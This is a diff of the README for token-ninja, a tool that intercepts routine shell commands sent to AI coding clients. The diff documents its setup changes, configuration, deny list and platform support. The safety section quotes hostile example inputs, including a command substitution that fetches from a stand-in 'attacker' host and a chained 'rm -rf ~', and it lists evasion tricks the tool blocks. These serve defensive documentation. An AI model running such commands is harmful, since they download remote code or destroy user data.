@@ -79,6 +79,7 @@ gets out of the way for everything else.
 - [MCP integration](#mcp-integration)
 - [Configuration](#configuration)
 - [Safety model](#safety-model)
+- [Platform support](#platform-support)
 - [Commands](#commands)
 - [Benchmarks](#benchmarks)
 - [Development](#development)
@@ -114,30 +115,36 @@ Neither will ever be the slow part of your day.
 
 ```bash
 npm install -g token-ninja
+ninja setup
 ```
 
-A postinstall hook registers `ninja mcp` as an MCP server in every AI client
-it can find on your machine — Claude Code (`~/.claude.json`), Cursor
+`ninja setup` registers `ninja mcp` as an MCP server in every AI client it
+can find on your machine — Claude Code (`~/.claude.json`), Cursor
 (`~/.cursor/mcp.json`), and Claude Desktop — so the next time you open your
 AI tool, it already knows to consult token-ninja before spending tokens on
 commands like `git status`, `npm test`, or `docker ps`.
 
-For **Claude Code** specifically, the same postinstall also writes a
-`UserPromptSubmit` hook into `~/.claude/settings.json`. That event fires
-*before* your prompt turns into an API call — if token-ninja recognizes it
-with high confidence (exact or prefix match), the hook executes locally
-and short-circuits the model entirely. The prompt is never sent, the
-response is never generated: **zero input tokens, zero output tokens.**
-Anything conversational flows through to Claude untouched.
+For **Claude Code** specifically, setup also writes a `UserPromptSubmit`
+hook into `~/.claude/settings.json`. That event fires *before* your prompt
+turns into an API call — if token-ninja recognizes it with high confidence
+(exact or prefix match), the hook executes locally and short-circuits the
+model entirely. The prompt is never sent, the response is never generated:
+**zero input tokens, zero output tokens.** Anything conversational flows
+through to Claude untouched.
 
 Existing MCP entries are preserved, each file is backed up once
 (`*.token-ninja.bak`) before the first write, and malformed configs are
 skipped safely instead of failing the install.
 
-> **Requirements:** Node ≥ 20.
+> **Why the second command?** `ninja setup` edits your shell rc file,
+> registers MCP servers and installs a Claude Code hook. Those are changes
+> outside the package directory, so they are not something `npm install`
+> should do behind your back — and installs run with `--ignore-scripts`
+> would silently skip them anyway. Set `TOKEN_NINJA_AUTO_SETUP=1` before
+> installing if you want it to run automatically.
 >
-> **Opt out of the postinstall hook entirely:**
-> `TOKEN_NINJA_SKIP_POSTINSTALL=1 npm install -g token-ninja`
+> **Requirements:** Node ≥ 20, and a POSIX shell — see
+> [Platform support](#platform-support).
 >
 > **Roll back any time:** `ninja uninstall` — removes the MCP entry from
 > every client config it wrote to, and the UserPromptSubmit hook from
@@ -258,7 +265,7 @@ dangerous command past the classifier.
   including homoglyph, NFKC, chained, and base64-decoded evasion. Safety
   is validated **twice**: once on the raw prompt and once on the expanded
   command.
-- **Battle-tested**: 312 tests across 21 files covering classifier edge
+- **Battle-tested**: 398 tests across 28 files covering classifier edge
   cases, safety bypasses, conversational look-alikes, hook safeguards, and
   ≥99% rule coverage over 1090 real-world fixture commands. v8 coverage
   holds at 90%+ lines / 95%+ functions on all router/safety/rules code.
@@ -571,9 +578,18 @@ Notes:
   caller's job. It only returns `handled:true` or a `reason`.
 - Safety is validated twice inside ninja (raw input + resolved command), so
   you can trust `handled:true` outputs without re-checking.
-- For programmatic usage without MCP at all, import `routeOnce` directly:
-  `import { routeOnce } from "token-ninja/dist/router/route-once.js"` and
-  call it like the stdio server does.
+- For programmatic usage without MCP at all, import from the package root:
+
+  ```ts
+  import { routeOnce, validate, loadRules } from "token-ninja";
+
+  const result = await routeOnce("git status", { cwd: process.cwd() });
+  ```
+
+  The package entry is a library — importing it does not start the CLI — and
+  ships TypeScript declarations. Deep paths such as
+  `token-ninja/dist/router/route-once.js` are no longer importable; use the
+  root export.
 
 ## Configuration
 
@@ -583,18 +599,38 @@ box. If you want to tune things:
 `~/.config/token-ninja/config.yaml`
 
 ```yaml
+default_ai_tool: claude                        # who gets the fallback
+fallback_command: "{{tool}} {{input}}"          # see the note below
 custom_rules_dir: ~/.config/token-ninja/rules  # where your own rules live
+intercept_user_prompts: true                   # Claude Code hook may short-circuit
+exec:
+  timeout_ms: 120000                           # kill a local command after this
+  max_output_bytes: 1048576                    # truncate captured output past this
 stats:
-  enabled: true
+  enabled: false                               # set false to record nothing at all
   show_savings_on_exit: true                   # "⚡ handled by token-ninja" line
   verbose: false
 ```
+
+`exec.timeout_ms` and `exec.max_output_bytes` are what keep a local hit from
+costing more than the AI round-trip it replaced: an MCP caller cannot Ctrl-C
+a command that never exits, and a command that prints 40 MB would spend all
+of it as context tokens. Set either to `0` to disable that bound.
+
+`fallback_command` is a **shell** template, used only when you change it from
+the default. `{{tool}}` and `{{input}}` expand to environment *references*
+(`"$TOKEN_NINJA_AI_TOOL"`, `"$TOKEN_NINJA_INPUT"`) and the values are handed
+to the child process through its environment — they never become part of the
+command text, so a command that failed the safety check has nothing to break
+out of. Everything else you put in the template runs as you wrote it. Custom
+templates are POSIX-only; on Windows the AI tool is invoked directly.
 
 Environment variables:
 
 | Variable                          | Effect                                                       |
 | --------------------------------- | ------------------------------------------------------------ |
-| `TOKEN_NINJA_SKIP_POSTINSTALL=1`  | Skip the automatic setup on `npm i -g`.                      |
+| `TOKEN_NINJA_AUTO_SETUP=1`        | Run `ninja setup` automatically during `npm i -g`.           |
+| `TOKEN_NINJA_SKIP_POSTINSTALL=1`  | Silence the postinstall message entirely.                    |
 | `CLAUDE_CONFIG_PATH=<path>`       | Override the Claude Code config path used by `ninja setup`.  |
 | `XDG_CONFIG_HOME`                 | Honored for the token-ninja config dir and Claude Desktop on Linux. |
 
@@ -613,12 +649,45 @@ What we block:
 - SQL footguns (`DROP TABLE`, `DELETE` / `UPDATE` without `WHERE`)
 - container / cluster footguns (`docker system prune -af`, `kubectl delete`
   without `--dry-run`)
+- **command substitution** — `$(…)`, backticks and `<(…)`. The validator
+  reasons about text and cannot know what a substitution expands to at run
+  time, so `ls $(curl -s http://attacker/x)` is refused outright rather than
+  vetted on the harmless-looking outer command
 - **evasion tricks**: homoglyph lookalikes (`ѕudo` with Cyrillic `ѕ`), NFKC
-  normalization attacks, chained `&& / ; / |`, quoted / back-ticked
-  substitution, base64 decode piped to a shell
+  normalization attacks, chained `&& / ; / |`, base64 decode piped to a shell
 
 Deny-listed inputs **never execute locally**. They fall back to the AI, where a
 human can review the explanation before anything runs.
+
+**The fallback does not re-introduce what the deny-list rejected.** A blocked
+command is handed to your AI tool as a single argument, with no shell in
+between — so `git status; rm -rf ~` reaches Claude as one opaque string to
+explain, not as two commands to run. If you set a custom `fallback_command`,
+a shell is involved but the input still is not part of the command text: it
+arrives through the environment, and POSIX shells do not rescan an expanded
+value, so `$(…)` and backticks inside it stay literal. (Before 0.6.0 this
+path interpolated the input into a shell command unquoted, which made every
+deny pattern advisory; `tests/fallback-injection.test.ts` now covers it.)
+
+Rules marked `requires_tty` (`docker exec -it`, `kubectl exec -it`) are handed
+back rather than run headless, since capturing their output would either hang
+them or fail with *the input device is not a TTY*.
+
+## Platform support
+
+| Platform                    | Status                                             |
+| --------------------------- | -------------------------------------------------- |
+| Linux, macOS                | Supported and tested in CI                          |
+| WSL                         | Supported (reports as Linux)                        |
+| Windows (native cmd/PowerShell) | **Not supported**                               |
+
+`ninja setup` writes shell functions into `~/.bashrc`, `~/.zshrc` or the fish
+config, and resolves the real AI binary with `command -v`. None of that has a
+native-Windows equivalent today, so the shim and setup flow are POSIX-only.
+The package still compiles and packs on Windows in CI so the win32 code paths
+in `src/` cannot rot, and the MCP server itself is portable — a Windows user
+can register `ninja mcp` by hand and use the tool through their AI client
+without the shell shim.
 
 ## Commands
 
@@ -626,9 +695,10 @@ You almost never need these — setup is automatic. Kept for diagnostics and
 power users.
 
 ```
-ninja setup [--dry-run] [--no-mcp] [--tool …]
-                              auto-register token-ninja with every AI client
-                              it can detect (the postinstall default)
+ninja setup [--dry-run] [--no-mcp] [--no-hook] [--tool …]
+                              shell shims + register token-ninja with every AI
+                              client it can detect; run this after install
+ninja doctor [--json]         diagnose the install (rules, shim, MCP, hook)
 ninja uninstall               undo setup; remove MCP entries from client configs
 ninja mcp                     run the stdio MCP server (what the AI tool calls)
 ninja stats [--json] [--reset]
@@ -644,30 +714,39 @@ non-negotiable. The test suite is the safety net.
 
 | Metric                          | Value                              |
 | ------------------------------- | ---------------------------------- |
-| Test files                      | **17**                             |
-| Tests                           | **234** (all passing)              |
-| Line coverage                   | **92.2%** &nbsp;(threshold: 85%)   |
-| Branch coverage                 | **84.3%** &nbsp;(threshold: 80%)   |
-| Function coverage               | **95.2%** &nbsp;(threshold: 95%)   |
-| Statement coverage              | **92.2%** &nbsp;(threshold: 85%)   |
+| Test files                      | **28**                             |
+| Tests                           | **391** (all passing)              |
+| Line coverage                   | **88.0%** &nbsp;(threshold: 86%)   |
+| Branch coverage                 | **81.0%** &nbsp;(threshold: 79%)   |
+| Function coverage               | **94.0%** &nbsp;(threshold: 92%)   |
+| Statement coverage              | **88.0%** &nbsp;(threshold: 86%)   |
 | Real-command fixture hit-rate   | **100%** on 657 commands (floor: 85%) |
 | `classify()` benchmark          | **~19 µs/call** (10 k in < 800 ms) |
-| `validate()` benchmark          | **~10 µs/call**  (10 k in < 100 ms) |
+| `validate()` benchmark          | **~4.5 µs/call** (10 k in < 100 ms) |
 
-Coverage is enforced by `vitest` + `@vitest/coverage-v8` against
-`src/router/**`, `src/safety/**`, and `src/rules/**`.
+Coverage is enforced by `vitest` + `@vitest/coverage-v8` across all of
+`src/`, excluding entry points and type-only modules — including `setup/`
+and `doctor/`, the code that edits your shell rc file.
 
 CI gates (see [`.github/workflows/ci.yml`](.github/workflows/ci.yml)):
 
 - `lint` — ESLint flat config, typed rules
 - `typecheck` — `tsc --noEmit`
+- `docs` — `rule-stats:check`; fails when the counts in this README drift
+- `audit` — blocking on production dependencies, reporting on dev
+- `dependency-review` — on PRs, flags high-severity and copyleft additions.
+  Skipped until you enable Dependency graph in repo settings and set the
+  `DEPENDENCY_REVIEW=true` Actions variable; see the comment in `ci.yml`
 - `build` — emits `dist/`, copies YAML rules, runs `npm pack --dry-run`
+- `build (windows)` — compile + pack only; the suite is POSIX-only
 - `test` — Node 20 & 22 on `ubuntu-latest`, plus Node 20 on `macos-latest`
-- `coverage` — uploaded as a workflow artifact
+- `bench` — benchmark budgets, scaled for runner noise
+- CodeQL — `security-extended`, weekly and on every PR
 
-Benchmark assertions scale automatically on CI (`BENCH_FACTOR` auto-detected);
-run `BENCH_FACTOR=1 npm test` locally for strict regression numbers, or set
-`SKIP_BENCH=1` to treat benchmarks as informational.
+Benchmarks live outside `npm test` (a wall-clock budget says as much about
+the machine as about the code). Run them with `npm run bench`; assertions
+scale automatically on CI via `BENCH_FACTOR`, and `BENCH_FACTOR=1` gives
+strict local numbers.
 
 ## Development
 
@@ -679,9 +758,12 @@ npm install
 npm run lint             # eslint flat config
 npm run typecheck        # tsc --noEmit
 npm run build            # tsc + copy YAML rules to dist/
-npm test                 # vitest run, 218 tests
+npm test                 # vitest run, 398 tests
 npm run test:watch       # watch mode
 npm run test:coverage    # v8 coverage, thresholds enforced
+npm run bench            # benchmark budgets (not part of npm test)
+npm run rule-stats:sync  # rewrite rule/test counts in the docs
+npm run rule-stats:check # fail if those counts have drifted
 ```
 
 Handy development commands:
